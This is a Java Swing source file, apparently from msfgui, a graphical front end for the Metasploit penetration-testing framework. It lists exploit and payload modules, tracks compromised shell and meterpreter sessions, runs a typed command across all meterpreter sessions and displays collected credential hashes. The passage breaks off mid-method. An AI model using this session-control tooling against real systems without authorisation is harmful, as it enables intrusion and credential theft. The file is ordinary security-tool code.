/*
 * MainFrame.java
 */
package msfgui;

import java.awt.Component;
import java.awt.HeadlessException;
import org.jdesktop.application.Action;
import org.jdesktop.application.ResourceMap;
import org.jdesktop.application.SingleFrameApplication;
import org.jdesktop.application.FrameView;
import org.jdesktop.application.TaskMonitor;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Map;
import java.util.HashMap;
import java.util.TreeMap;
import java.util.ArrayList;
import java.util.List;
import javax.swing.Timer;
import javax.swing.Icon;
import javax.swing.JComponent;
import javax.swing.JDialog;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPopupMenu;
import javax.swing.SwingUtilities;
import javax.swing.UIManager;
import org.jdesktop.application.Task;
import org.jdesktop.swingworker.SwingWorker;
import org.w3c.dom.Element;

/** The application's main frame. */
public class MainFrame extends FrameView {
	public static final int MENU_SIZE_LIMIT = 30;

	public HashMap sessionPopupMap;
	public RpcConnection rpcConn;
	private SwingWorker sessionsPollTimer;
	private SessionsTable sessionsTableModel;
	private JPopupMenu jobPopupMenu, shellPopupMenu, meterpreterPopupMenu, sessionPopupMenu;
	private String clickedJob;
	public Map[] selectedSessions;
	private SearchWindow searchWin;

	public MainFrame(SingleFrameApplication app) {
		super(app);
		initComponents();
		splitPane.setDividerLocation(200);
		sessionsTableModel = null;
		sessionPopupMap = new HashMap();

		//Set up action for starting RPC
		startRpcMenuItem.setAction(getContext().getActionMap(this).get("startRpc"));
		startRpcMenuItem.setMnemonic('S');
		org.jdesktop.application.ResourceMap resources = org.jdesktop.application.Application.getInstance(
				msfgui.MsfguiApp.class).getContext().getResourceMap(MainFrame.class);
		startRpcMenuItem.setText(resources.getString("startRpcMenuItem.text")); 
		
		// status bar initialization - message timeout, idle icon and busy animation, etc
		ResourceMap resourceMap = getResourceMap();
		int messageTimeout = resourceMap.getInteger("StatusBar.messageTimeout");
		messageTimer = new Timer(messageTimeout, new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				statusMessageLabel.setText("");
			}
		});
		messageTimer.setRepeats(false);
		int busyAnimationRate = resourceMap.getInteger("StatusBar.busyAnimationRate");
		for (int i = 0; i < busyIcons.length; i++) 
			busyIcons[i] = resourceMap.getIcon("StatusBar.busyIcons[" + i + "]");
		busyIconTimer = new Timer(busyAnimationRate, new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				busyIconIndex = (busyIconIndex + 1) % busyIcons.length;
				statusAnimationLabel.setIcon(busyIcons[busyIconIndex]);
			}
		});
		idleIcon = resourceMap.getIcon("StatusBar.idleIcon");
		statusAnimationLabel.setIcon(idleIcon);
		progressBar.setVisible(false);

		// connecting action tasks to status bar via TaskMonitor
		TaskMonitor taskMonitor = new TaskMonitor(getApplication().getContext());
		taskMonitor.addPropertyChangeListener(new java.beans.PropertyChangeListener() {
			public void propertyChange(java.beans.PropertyChangeEvent evt) {
				String propertyName = evt.getPropertyName();
				if ("started".equals(propertyName)) {
					if (!busyIconTimer.isRunning()) {
						statusAnimationLabel.setIcon(busyIcons[0]);
						busyIconIndex = 0;
						busyIconTimer.start();
					}
					progressBar.setVisible(true);
					progressBar.setIndeterminate(true);
				} else if ("done".equals(propertyName)) {
					busyIconTimer.stop();
					statusAnimationLabel.setIcon(idleIcon);
					progressBar.setVisible(false);
					progressBar.setValue(0);
				} else if ("message".equals(propertyName)) {
					String text = (String)(evt.getNewValue());
					statusMessageLabel.setText((text == null) ? "" : text);
					messageTimer.restart();
				} else if ("progress".equals(propertyName)) {
					int value = (Integer)(evt.getNewValue());
					progressBar.setVisible(true);
					progressBar.setIndeterminate(false);
					progressBar.setValue(value);
				}
			}
		});
		//Set up GUI, RPC connection, and recent modules
		setupSessionsPollTimer();
		setupPopupMenus();
		setLnF(false);
		MsfguiApp.fileChooser = new JFileChooser();
		connectRpc();
		//Setup icon
		this.getFrame().setIconImage( resourceMap.getImageIcon("main.icon").getImage());
	}

	/** Set up auto session and job refresh */
	private void setupSessionsPollTimer() throws HeadlessException {
		sessionsPollTimer = new SwingWorker(){
			@Override
			protected List doInBackground() throws Exception {
				int delay = 500;
				while(true){
					try {
						Thread.sleep(delay);
						//update sessions
						Map slist = (Map) rpcConn.execute("session.list");
						ArrayList sessionList = new ArrayList();
						for (Object sid : slist.keySet()) {
							Map session = (Map) slist.get(sid);
							session.put("id", sid);
							MsfguiLog.defaultLog.logSession(session);
							sessionList.add(slist.get(sid));
							if((session.get("type").equals("meterpreter") || session.get("type").equals("shell"))
									&& sessionPopupMap.get(session.get("uuid")) == null)
								sessionPopupMap.put(session.get("uuid"), new InteractWindow(
										rpcConn, session, session.get("type").toString()));
						}
						MsfguiLog.defaultLog.checkSessions(slist);//Alert the logger
						if (sessionsTableModel == null) {
							sessionsTableModel = new SessionsTable(sessionList);
							sessionsTable.setModel(sessionsTableModel);
						} else {
							publish(sessionList);
						}
						//Update jobs
						Map jlist = (Map) ((Map)rpcConn.execute("job.list")).get("jobs");
						TreeMap orderedJobsList = new TreeMap();
						orderedJobsList.putAll(jlist);
						int i = 0;
						String[] jobStrings = new String[jlist.size()];
						for (Object jid : orderedJobsList.keySet()) {
							jobStrings[i] = jid.toString() + " - " + orderedJobsList.get(jid).toString();
							i++;
						}
						publish((Object)jobStrings);
					} catch (MsfException xre) {
						JOptionPane.showMessageDialog(null, xre);
						delay *= 2;
					} catch (InterruptedException iex){
					}
				}
			}
			@Override
			protected void process(List lis){
				for(Object o : lis){
					if(o instanceof List){
						sessionsTableModel.updateSessions((List)o);
						TableHelper.fitColumnWidths(sessionsTableModel,sessionsTable);
						sessionsTable.updateUI();
					}else if (o instanceof String[]){
						jobsList.setListData((String[])o);
					}
				}
			}
		};
	}

   /**
	* Makes a menu tree from a list of modules, and sets action
	* listeners from the given factory.
	* @param mlist List of modules.
	* @param rootMenu Base menu to build tree off of.
	* @param factory Factory to generate handlers to do the actions.
	*/
	private void expandList(Object[] mlist, JMenu rootMenu, RunMenuFactory factory, String type) {
		if (mlist == null)
			return;
                java.util.Arrays.sort(mlist);
		for (Object fullName : mlist) {
			String[] names = fullName.toString().split("/");
			JMenu currentMenu = rootMenu;
			for (int i = 0; i < names.length; i++) {
				boolean found = false;
				Component[] comps = currentMenu.getMenuComponents();

				boolean searchNext = true;
				while(!found && searchNext){ //if "More..." listed, search through more list
					searchNext = false;
					Component [] compsCopy = comps;
					for (Component menu : compsCopy) {
						if (menu.getName().equals(names[i]) && menu instanceof JMenu) {
							if (i < names.length - 1) 
								currentMenu = (JMenu) menu;
							found = true;
							break;
						}else if (menu.getName().equals("More...")){
							searchNext = true;
							comps = ((JMenu)menu).getMenuComponents();
							currentMenu = (JMenu) menu;
						}
					}
				}

				if (!found) {
					if(comps.length > MENU_SIZE_LIMIT){ //extend if necessary
						JMenu extention = new JMenu("More...");
						extention.setName("More...");
						currentMenu.add(extention);
						currentMenu = extention;
					}
					if (i < names.length - 1) {
						JMenu men = new JMenu(names[i]);
						men.setName(names[i]);
						currentMenu.add(men);
						currentMenu = (JMenu) men;
					} else {
						JMenuItem men = new JMenuItem(names[i]);
						men.setName(names[i]);
						currentMenu.add(men);
						ActionListener actor = factory.getActor(fullName.toString(),type,rpcConn);
						men.addActionListener(actor);
						searchWin.modules.add(new Object[]{type, fullName.toString(),actor});
					}
				}
			}//end for each subname
		}//end for each module
	}//end expandList()

   /** Displays info including version */
	@Action
	public void showAboutBox() {
		String version = "";
		try {
			Map results = (Map)rpcConn.execute("core.version");
			version = results.get("version").toString();
		} catch (MsfException xre) {
			JOptionPane.showMessageDialog(this.getFrame(), xre);
		} catch (NullPointerException nex) {
		}
		if (aboutBox == null)
			aboutBox = new MsfguiAboutBox(getFrame(),version);
		MsfguiApp.getApplication().show(aboutBox);
	}

   /** Makes a menu tree with expandList for exploits and auxiliary. Also start jobs/sessions watcher. */
	public void getModules() {
		searchWin = new SearchWindow(rpcConn);
		MsfguiApp.addRecentModules(recentMenu, rpcConn);
		getContext().getActionMap(this).get("moduleTask").actionPerformed(new java.awt.event.ActionEvent(this,1234,""));
	}

	/** helper for getModules - does the work */
	@Action
	public Task moduleTask(){
		final MainFrame me = this;
		return new Task<Void, Void>(getApplication()){
			@Override
			protected Void doInBackground() throws Exception {
				setTitle("Connected to running msfrpcd. Getting module lists.");
				setProgress(0.0f);
				//Get modules lists
				try {
					// yeah three layer deep nested inner classes sucks but I hate making new files for each one
					RunMenuFactory moduleFactory =  new RunMenuFactory(){
						public ActionListener getActor(final String modName, final String type, final RpcConnection rpcConn) {
							return new ActionListener(){
								public void actionPerformed(ActionEvent e) {
									new ModulePopup(modName,rpcConn,type, recentMenu).setVisible(true);
								}
							};
						}
					};
					//Exploits and auxiliary get modulepopups; payloads get payloadpopups duh
					setMessage("Getting exploits");
					expandList((Object[]) ((Map)rpcConn.execute("module.exploits")).get("modules"), exploitsMenu, moduleFactory, "exploit");
					setProgress(0.33f);
					setMessage("Getting auxiliary modules");
					expandList((Object[]) ((Map)rpcConn.execute("module.auxiliary")).get("modules"), auxiliaryMenu, moduleFactory, "auxiliary");
					setProgress(0.66f);
					setMessage("Getting payloads");
					expandList((Object[]) ((Map)rpcConn.execute("module.payloads")).get("modules"), payloadsMenu, new RunMenuFactory(){
						public ActionListener getActor(final String modName, final String type, final RpcConnection rpcConn) {
							return new ActionListener() {
								public void actionPerformed(ActionEvent e) {
									new PayloadPopup(modName, rpcConn, me).setVisible(true);
								}
							};
						}
					}, "payload");
					setProgress(1.0f);
				} catch (MsfException ex) {
					statusAnimationLabel.setText("Error getting module lists. " + ex);
				}
				return null;
			}

			@Override
			protected void succeeded(Void blah) {
				sessionsPollTimer.execute();
				statusAnimationLabel.setText("Ready");
				setMessage("");
			}
		};
	}
	

	/** This method is called from within the constructor to
	 * initialize the form.
	 * WARNING: Do NOT modify this code. The content of this method is
	 * always regenerated by the Form Editor.
	 */
	@SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        mainPanel = new javax.swing.JPanel();
        splitPane = new javax.swing.JSplitPane();
        jobsPanel = new javax.swing.JPanel();
        jobsLabel = new javax.swing.JLabel();
        jScrollPane1 = new javax.swing.JScrollPane();
        jobsList = new javax.swing.JList();
        sessionsPanel = new javax.swing.JPanel();
        sessionsLabel = new javax.swing.JLabel();
        jScrollPane2 = new javax.swing.JScrollPane();
        sessionsTable = new javax.swing.JTable();
        searchButton = new javax.swing.JButton();
        menuBar = new javax.swing.JMenuBar();
        javax.swing.JMenu fileMenu = new javax.swing.JMenu();
        connectRpcMenuItem = new javax.swing.JMenuItem();
        startRpcMenuItem = new javax.swing.JMenuItem();
        jSeparator1 = new javax.swing.JPopupMenu.Separator();
        changeLFMenuItem = new javax.swing.JMenuItem();
        javax.swing.JMenuItem exitMenuItem = new javax.swing.JMenuItem();
        exploitsMenu = new javax.swing.JMenu();
        auxiliaryMenu = new javax.swing.JMenu();
        payloadsMenu = new javax.swing.JMenu();
        historyMenu = new javax.swing.JMenu();
        recentMenu = new javax.swing.JMenu();
        clearHistoryItem = new javax.swing.JMenuItem();
        postMenu = new javax.swing.JMenu();
        menuRunAllMeterp = new javax.swing.JMenu();
        otherMeterpCommandMenu = new javax.swing.JMenuItem();
        killSessionsMenuItem = new javax.swing.JMenuItem();
        collectedCredsMenuItem = new javax.swing.JMenuItem();
        logGenerateMenuItem = new javax.swing.JMenuItem();
        helpMenu = new javax.swing.JMenu();
        onlineHelpMenu = new javax.swing.JMenuItem();
        javax.swing.JMenuItem aboutMenuItem = new javax.swing.JMenuItem();
        statusPanel = new javax.swing.JPanel();
        statusMessageLabel = new javax.swing.JLabel();
        statusAnimationLabel = new javax.swing.JLabel();
        progressBar = new javax.swing.JProgressBar();

        mainPanel.setName("mainPanel"); // NOI18N

        splitPane.setBorder(null);
        splitPane.setLastDividerLocation(250);
        splitPane.setName("splitPane"); // NOI18N
        splitPane.setPreferredSize(new java.awt.Dimension(30, 20));

        jobsPanel.setName("jobsPanel"); // NOI18N
        jobsPanel.setPreferredSize(new java.awt.Dimension(10, 19));

        org.jdesktop.application.ResourceMap resourceMap = org.jdesktop.application.Application.getInstance(msfgui.MsfguiApp.class).getContext().getResourceMap(MainFrame.class);
        jobsLabel.setText(resourceMap.getString("jobsLabel.text")); // NOI18N
        jobsLabel.setName("jobsLabel"); // NOI18N

        jScrollPane1.setName("jScrollPane1"); // NOI18N
        jScrollPane1.setPreferredSize(new java.awt.Dimension(10, 10));

        jobsList.setName("jobsList"); // NOI18N
        jScrollPane1.setViewportView(jobsList);

        javax.swing.GroupLayout jobsPanelLayout = new javax.swing.GroupLayout(jobsPanel);
        jobsPanel.setLayout(jobsPanelLayout);
        jobsPanelLayout.setHorizontalGroup(
            jobsPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 37, Short.MAX_VALUE)
            .addGroup(jobsPanelLayout.createSequentialGroup()
                .addComponent(jobsLabel)
                .addContainerGap())
        );
        jobsPanelLayout.setVerticalGroup(
            jobsPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jobsPanelLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jobsLabel)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 411, Short.MAX_VALUE)
                .addContainerGap())
        );

        splitPane.setLeftComponent(jobsPanel);

        sessionsPanel.setName("sessionsPanel"); // NOI18N

        sessionsLabel.setText(resourceMap.getString("sessionsLabel.text")); // NOI18N
        sessionsLabel.setName("sessionsLabel"); // NOI18N

        jScrollPane2.setName("jScrollPane2"); // NOI18N

        sessionsTable.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {

            },
            new String [] {

            }
        ));
        sessionsTable.setName("sessionsTable"); // NOI18N
        sessionsTable.setSelectionMode(javax.swing.ListSelectionModel.MULTIPLE_INTERVAL_SELECTION);
        jScrollPane2.setViewportView(sessionsTable);

        searchButton.setText(resourceMap.getString("searchButton.text")); // NOI18N
        searchButton.setName("searchButton"); // NOI18N
        searchButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                searchButtonActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout sessionsPanelLayout = new javax.swing.GroupLayout(sessionsPanel);
        sessionsPanel.setLayout(sessionsPanelLayout);
        sessionsPanelLayout.setHorizontalGroup(
            sessionsPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(sessionsPanelLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(sessionsLabel)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 710, Short.MAX_VALUE)
                .addComponent(searchButton))
            .addComponent(jScrollPane2, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 845, Short.MAX_VALUE)
        );
        sessionsPanelLayout.setVerticalGroup(
            sessionsPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(sessionsPanelLayout.createSequentialGroup()
                .addGroup(sessionsPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(sessionsPanelLayout.createSequentialGroup()
                        .addGap(12, 12, 12)
                        .addComponent(sessionsLabel))
                    .addComponent(searchButton))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 412, Short.MAX_VALUE)
                .addContainerGap())
        );

        splitPane.setRightComponent(sessionsPanel);

        javax.swing.GroupLayout mainPanelLayout = new javax.swing.GroupLayout(mainPanel);
        mainPanel.setLayout(mainPanelLayout);
        mainPanelLayout.setHorizontalGroup(
            mainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(mainPanelLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(splitPane, javax.swing.GroupLayout.DEFAULT_SIZE, 887, Short.MAX_VALUE)
                .addContainerGap())
        );
        mainPanelLayout.setVerticalGroup(
            mainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, mainPanelLayout.createSequentialGroup()
                .addComponent(splitPane, javax.swing.GroupLayout.DEFAULT_SIZE, 460, Short.MAX_VALUE)
                .addContainerGap())
        );

        menuBar.setName("menuBar"); // NOI18N

        fileMenu.setMnemonic('F');
        fileMenu.setText(resourceMap.getString("fileMenu.text")); // NOI18N
        fileMenu.setName("fileMenu"); // NOI18N

        connectRpcMenuItem.setMnemonic('C');
        connectRpcMenuItem.setText(resourceMap.getString("connectRpcMenuItem.text")); // NOI18N
        connectRpcMenuItem.setName("connectRpcMenuItem"); // NOI18N
        connectRpcMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                connectRpcMenuItemActionPerformed(evt);
            }
        });
        fileMenu.add(connectRpcMenuItem);

        startRpcMenuItem.setMnemonic('S');
        startRpcMenuItem.setText(resourceMap.getString("startRpcMenuItem.text")); // NOI18N
        startRpcMenuItem.setName("startRpcMenuItem"); // NOI18N
        fileMenu.add(startRpcMenuItem);

        jSeparator1.setName("jSeparator1"); // NOI18N
        fileMenu.add(jSeparator1);

        changeLFMenuItem.setMnemonic('L');
        changeLFMenuItem.setText(resourceMap.getString("changeLFMenuItem.text")); // NOI18N
        changeLFMenuItem.setName("changeLFMenuItem"); // NOI18N
        changeLFMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                changeLFMenuItemActionPerformed(evt);
            }
        });
        fileMenu.add(changeLFMenuItem);

        javax.swing.ActionMap actionMap = org.jdesktop.application.Application.getInstance(msfgui.MsfguiApp.class).getContext().getActionMap(MainFrame.class, this);
        exitMenuItem.setAction(actionMap.get("quit")); // NOI18N
        exitMenuItem.setName("exitMenuItem"); // NOI18N
        exitMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                exitMenuItemActionPerformed(evt);
            }
        });
        fileMenu.add(exitMenuItem);

        menuBar.add(fileMenu);

        exploitsMenu.setMnemonic('E');
        exploitsMenu.setText(resourceMap.getString("exploitsMenu.text")); // NOI18N
        exploitsMenu.setName("exploitsMenu"); // NOI18N
        menuBar.add(exploitsMenu);

        auxiliaryMenu.setMnemonic('A');
        auxiliaryMenu.setText(resourceMap.getString("auxiliaryMenu.text")); // NOI18N
        auxiliaryMenu.setName("auxiliaryMenu"); // NOI18N
        menuBar.add(auxiliaryMenu);

        payloadsMenu.setMnemonic('P');
        payloadsMenu.setText(resourceMap.getString("payloadsMenu.text")); // NOI18N
        payloadsMenu.setName("payloadsMenu"); // NOI18N
        menuBar.add(payloadsMenu);

        historyMenu.setMnemonic('H');
        historyMenu.setText(resourceMap.getString("historyMenu.text")); // NOI18N
        historyMenu.setName("historyMenu"); // NOI18N

        recentMenu.setMnemonic('R');
        recentMenu.setText(resourceMap.getString("recentMenu.text")); // NOI18N
        recentMenu.setEnabled(false);
        recentMenu.setName("recentMenu"); // NOI18N
        historyMenu.add(recentMenu);

        clearHistoryItem.setMnemonic('H');
        clearHistoryItem.setText(resourceMap.getString("clearHistoryItem.text")); // NOI18N
        clearHistoryItem.setName("clearHistoryItem"); // NOI18N
        clearHistoryItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                clearHistoryItemActionPerformed(evt);
            }
        });
        historyMenu.add(clearHistoryItem);

        menuBar.add(historyMenu);

        postMenu.setMnemonic('t');
        postMenu.setText(resourceMap.getString("postMenu.text")); // NOI18N
        postMenu.setName("postMenu"); // NOI18N

        menuRunAllMeterp.setMnemonic('R');
        menuRunAllMeterp.setText(resourceMap.getString("menuRunAllMeterp.text")); // NOI18N
        menuRunAllMeterp.setName("menuRunAllMeterp"); // NOI18N

        otherMeterpCommandMenu.setMnemonic('O');
        otherMeterpCommandMenu.setText(resourceMap.getString("otherMeterpCommandMenu.text")); // NOI18N
        otherMeterpCommandMenu.setName("otherMeterpCommandMenu"); // NOI18N
        otherMeterpCommandMenu.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                otherMeterpCommandMenuActionPerformed(evt);
            }
        });
        menuRunAllMeterp.add(otherMeterpCommandMenu);

        postMenu.add(menuRunAllMeterp);

        killSessionsMenuItem.setMnemonic('K');
        killSessionsMenuItem.setText(resourceMap.getString("killSessionsMenuItem.text")); // NOI18N
        killSessionsMenuItem.setName("killSessionsMenuItem"); // NOI18N
        killSessionsMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                killSessionsMenuItemActionPerformed(evt);
            }
        });
        postMenu.add(killSessionsMenuItem);

        collectedCredsMenuItem.setMnemonic('S');
        collectedCredsMenuItem.setText(resourceMap.getString("collectedCredsMenuItem.text")); // NOI18N
        collectedCredsMenuItem.setName("collectedCredsMenuItem"); // NOI18N
        collectedCredsMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                collectedCredsMenuItemActionPerformed(evt);
            }
        });
        postMenu.add(collectedCredsMenuItem);

        logGenerateMenuItem.setMnemonic('G');
        logGenerateMenuItem.setText(resourceMap.getString("logGenerateMenuItem.text")); // NOI18N
        logGenerateMenuItem.setName("logGenerateMenuItem"); // NOI18N
        logGenerateMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                logGenerateMenuItemActionPerformed(evt);
            }
        });
        postMenu.add(logGenerateMenuItem);

        menuBar.add(postMenu);

        helpMenu.setMnemonic('H');
        helpMenu.setText(resourceMap.getString("helpMenu.text")); // NOI18N
        helpMenu.setName("helpMenu"); // NOI18N

        onlineHelpMenu.setMnemonic('O');
        onlineHelpMenu.setText(resourceMap.getString("onlineHelpMenu.text")); // NOI18N
        onlineHelpMenu.setName("onlineHelpMenu"); // NOI18N
        onlineHelpMenu.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                onlineHelpMenuActionPerformed(evt);
            }
        });
        helpMenu.add(onlineHelpMenu);

        aboutMenuItem.setAction(actionMap.get("showAboutBox")); // NOI18N
        aboutMenuItem.setName("aboutMenuItem"); // NOI18N
        helpMenu.add(aboutMenuItem);

        menuBar.add(helpMenu);

        statusPanel.setName("statusPanel"); // NOI18N

        statusMessageLabel.setName("statusMessageLabel"); // NOI18N

        statusAnimationLabel.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);
        statusAnimationLabel.setName("statusAnimationLabel"); // NOI18N

        progressBar.setName("progressBar"); // NOI18N

        javax.swing.GroupLayout statusPanelLayout = new javax.swing.GroupLayout(statusPanel);
        statusPanel.setLayout(statusPanelLayout);
        statusPanelLayout.setHorizontalGroup(
            statusPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(statusPanelLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(statusMessageLabel)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 736, Short.MAX_VALUE)
                .addComponent(progressBar, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(statusAnimationLabel)
                .addContainerGap())
        );
        statusPanelLayout.setVerticalGroup(
            statusPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, statusPanelLayout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGroup(statusPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(statusMessageLabel)
                    .addComponent(statusAnimationLabel)
                    .addComponent(progressBar, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(3, 3, 3))
        );

        setComponent(mainPanel);
        setMenuBar(menuBar);
        setStatusBar(statusPanel);
    }// </editor-fold>//GEN-END:initComponents

	private void exitMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_exitMenuItemActionPerformed
		System.exit(0);
	}//GEN-LAST:event_exitMenuItemActionPerformed

	private void connectRpcMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_connectRpcMenuItemActionPerformed
		connectRpc();
	}//GEN-LAST:event_connectRpcMenuItemActionPerformed

	private void clearHistoryItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_clearHistoryItemActionPerformed
		MsfguiApp.clearHistory(recentMenu);
	}//GEN-LAST:event_clearHistoryItemActionPerformed

	private void onlineHelpMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_onlineHelpMenuActionPerformed
		try{
			java.awt.Desktop.getDesktop().browse(new URI("http://www.metasploit.com/framework/support"));
		} catch (IOException ex){
			JOptionPane.showMessageDialog(this.getFrame(), "Can't open browser. See http://www.metasploit.com/framework/support");
		} catch ( URISyntaxException usx){
			JOptionPane.showMessageDialog(this.getFrame(), "Can't find the URL. This really should never happen. Report this bug.");
		}
	}//GEN-LAST:event_onlineHelpMenuActionPerformed

	private void otherMeterpCommandMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_otherMeterpCommandMenuActionPerformed
		final String command = JOptionPane.showInputDialog(this.getFrame(),
				"Enter a command","Run command on all meterpreter sessions", JOptionPane.QUESTION_MESSAGE);
		if(command == null)
			return;
		runOnAllMeterpreters(command,command,statusMessageLabel);
	}//GEN-LAST:event_otherMeterpCommandMenuActionPerformed

	private void logGenerateMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_logGenerateMenuItemActionPerformed
		try{
			java.awt.Desktop.getDesktop().browse(new URI("file://"+MsfguiApp.cleanBackslashes(MsfguiLog.defaultLog.save())));
		}catch (Exception iox){
			MsfguiApp.fileChooser.setCurrentDirectory(new File(MsfguiApp.getTempFolder()));
			MsfguiApp.fileChooser.setSelectedFile(new File("msfguilog.html"));
			try{
				if(MsfguiApp.fileChooser.showSaveDialog(this.getFrame()) == JFileChooser.APPROVE_OPTION)
					java.awt.Desktop.getDesktop().browse(new URI("file://"+MsfguiLog.defaultLog.save(
							MsfguiApp.cleanBackslashes(MsfguiApp.fileChooser.getSelectedFile().getAbsolutePath()))));
			}catch (Exception ex){
				JOptionPane.showMessageDialog(getFrame(), "Problem "+ex);
			}
		}
	}//GEN-LAST:event_logGenerateMenuItemActionPerformed

	private void killSessionsMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_killSessionsMenuItemActionPerformed
		for( Object sesObj : sessionsTableModel.sessions ){
			try{
				rpcConn.execute("session.stop", new Object[]{((Map)sesObj).get("id")});
			} catch (MsfException xre) {
				statusMessageLabel.setText("Error killing session "+((Map)sesObj).get("id"));
			}
		}
	}//GEN-LAST:event_killSessionsMenuItemActionPerformed

	private void changeLFMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_changeLFMenuItemActionPerformed
		setLnF(true);
	}//GEN-LAST:event_changeLFMenuItemActionPerformed

	private void collectedCredsMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_collectedCredsMenuItemActionPerformed
		new EditorWindow(MsfguiLog.defaultLog.getHashes()).setVisible(true);
	}//GEN-LAST:event_collectedCredsMenuItemActionPerformed

	private void searchButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_searchButtonActionPerformed
		searchWin.setVisible(true);
	}//GEN-LAST:event_searchButtonActionPerformed

	/** Runs command on all current meterpreter sessions in new thread; posting updates for each thread */
	private void runOnAllMeterpreters(String cmd, String output, JLabel outputLabel) {
		SessionCommand.runOnAllMeterpreters(sessionsTableModel, cmd, output, outputLabel, rpcConn);
	}

   /** Displays a dialog to connect to msfrpcd. */
	private void connectRpc() {
		//make new rpcConnection
		rpcConn = OpenConnectionDialog.getConnection(this);
		if(rpcConn != null)
			getModules();
	}

   /** Attempts to start msfrpcd and connect to it.*/
	@Action
	public Task startRpc() {
		return RpcConnection.startRpcConn(this);
	}
	public void showInteractWindow() {
		for(Map session : selectedSessions)
			((InteractWindow)(sessionPopupMap.get(session.get("uuid")))).setVisible(true);
	}
	/* Master function to setup popup menus for jobs and sessions
	 * First handles jobs, then shell sessions, then meterpreter sessions,
	 * and finally other sessions (like VNC).
	 */
	private void setupPopupMenus() throws HeadlessException {
		//JOB POPUP MENUS
		jobPopupMenu = new JPopupMenu();
		addSessionItem("Info",jobPopupMenu,new RpcAction() {
			public void action() throws Exception {
				Object obj = ((Map)rpcConn.execute("job.info", new Object[]{clickedJob})).get("info");
				(new JobInfoPopup(null, true, obj)).setVisible(true);
			}
		});
		addSessionItem("Stop",jobPopupMenu,new RpcAction() {
			public void action() throws Exception {
				if(!((Map)rpcConn.execute("job.stop", new Object[]{clickedJob})).get("result").equals("success"))
